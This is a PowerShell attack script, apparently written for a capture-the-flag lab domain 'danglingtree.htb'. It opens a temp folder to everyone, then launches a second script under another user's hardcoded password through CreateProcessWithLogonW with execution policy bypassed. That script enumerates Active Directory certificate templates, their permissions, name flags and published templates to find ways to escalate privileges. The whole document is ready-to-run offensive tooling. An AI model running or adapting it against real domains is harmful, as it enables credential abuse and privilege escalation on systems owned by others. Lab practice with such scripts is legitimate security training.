$ErrorActionPreference = 'Continue'
$dir = 'C:\Windows\Temp\jwork'
New-Item -ItemType Directory -Path $dir -Force | Out-Null
$out = "$dir\jake_out.txt"
$ps1 = "$dir\jake_work.ps1"
$psExe = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

# ACL so everyone can RW (in case jake needs read)
icacls $dir /grant '*S-1-1-0:(OI)(CI)F' /T 2>&1 | Out-Null

$work = @'
$ErrorActionPreference="Continue"
$log = "C:\Windows\Temp\jwork\jake_out.txt"
function L($x){ Add-Content -Path $log -Value ([string]$x) -Encoding UTF8 }
"" | Set-Content $log -Encoding UTF8
L ("whoami=" + (whoami 2>&1 | Out-String).Trim())
try { L ("id=" + [Security.Principal.WindowsIdentity]::GetCurrent().Name) } catch { L ("idERR "+$_) }
L "--- groups ---"
(whoami /groups 2>&1) | ForEach-Object { L $_ }
L "--- templates ---"
try {
  $tmplRoot = New-Object DirectoryServices.DirectoryEntry("LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb")
  $names = foreach($c in $tmplRoot.Children){ [string]$c.Properties["cn"].Value }
  L (($names | Sort-Object) -join ", ")
  L "--- container ACEs ---"
  $tmplRoot.ObjectSecurity.Access | Where-Object {
    $_.ActiveDirectoryRights.ToString() -match "CreateChild|GenericAll|WriteDacl|WriteOwner|GenericWrite" -or
    $_.IdentityReference -match "Template|Helpdesk|DevOps|Authenticated|Domain Users"
  } | ForEach-Object { L ("ACE " + $_.IdentityReference + " | " + $_.ActiveDirectoryRights + " | " + $_.AccessControlType) }
} catch { L ("tmpl ERR " + $_) }
L "--- published ---"
try {
  $es = New-Object DirectoryServices.DirectoryEntry("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb")
  foreach($ca in $es.Children){
    L ("CA=" + [string]$ca.Properties["cn"].Value)
    $pubs = @($ca.Properties["certificateTemplates"] | ForEach-Object { $_ })
    L ("PUB=" + ($pubs -join ","))
  }
} catch { L ("es ERR " + $_) }
L "--- key templates ---"
foreach($n in @("User","SubCA","Machine","Administrator","ClientAuth","EmployeeAuthTemplate","VPNUserTemplate","RemoteAccessVPN","WebServer","SmartcardLogon")){
  try {
    $t = New-Object DirectoryServices.DirectoryEntry("LDAP://CN=$n,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb")
    $flags = $t.Properties["msPKI-Certificate-Name-Flag"].Value
    $eku = (@($t.Properties["pKIExtendedKeyUsage"]) | ForEach-Object { $_ }) -join ";"
    L ("TMPL=$n nameFlag=$flags eku=$eku")
    $t.ObjectSecurity.Access | Where-Object {
      $_.ActiveDirectoryRights.ToString() -match "ExtendedRight|GenericAll|WriteDacl|WriteOwner|GenericWrite|CreateChild"
    } | ForEach-Object { L ("  ACE " + $_.IdentityReference + " | " + $_.ActiveDirectoryRights) }
  } catch { L ("TMPL=$n MISSING") }
}
L "--- certutil -ping ---"
L ((certutil -ping 2>&1 | Out-String))
L "--- certutil -CATemplates ---"
$ct = (certutil -CATemplates 2>&1 | Out-String)
if ($ct.Length -gt 6000) { $ct = $ct.Substring(0,6000) }
L $ct
L "DONE"
'@
[IO.File]::WriteAllText($ps1, $work)
"wrote $ps1 size=$((Get-Item $ps1).Length)"

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class CPWL3 {
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct STARTUPINFO {
    public int cb;
    public IntPtr lpReserved, lpDesktop, lpTitle;
    public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;
    public short wShowWindow,cbReserved2;
    public IntPtr lpReserved2,hStdInput,hStdOutput,hStdError;
  }
  [StructLayout(LayoutKind.Sequential)]
  public struct PROCESS_INFORMATION {
    public IntPtr hProcess,hThread; public int dwProcessId,dwThreadId;
  }
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool CreateProcessWithLogonW(
    string user, string domain, string pass, int logonFlags,
    string app, string cmd, int flags, IntPtr env, string cwd,
    ref STARTUPINFO si, out PROCESS_INFORMATION pi);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool GetExitCodeProcess(IntPtr h, out uint code);
}
"@

$si = New-Object CPWL3+STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object CPWL3+PROCESS_INFORMATION
$cmdline = "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$ps1`""
$ok = [CPWL3]::CreateProcessWithLogonW(
  'jake.h','danglingtree','Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan', 1,
  $psExe, $cmdline, 0, [IntPtr]::Zero, $dir,
  [ref]$si, [ref]$pi)
"CPWL ok=$ok err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()) pid=$($pi.dwProcessId)"
if ($ok) {
  [void][CPWL3]::WaitForSingleObject($pi.hProcess, 180000)
  $ec = 0; [void][CPWL3]::GetExitCodeProcess($pi.hProcess, [ref]$ec)
  "exit=$ec"
  [void][CPWL3]::CloseHandle($pi.hProcess)
  [void][CPWL3]::CloseHandle($pi.hThread)
}
Start-Sleep -Seconds 1
if (Test-Path $out) {
  "=== OUT ==="
  Get-Content $out -Raw
} else {
  "NO OUT"
  Get-ChildItem $dir -Force | Format-Table Name,Length
}
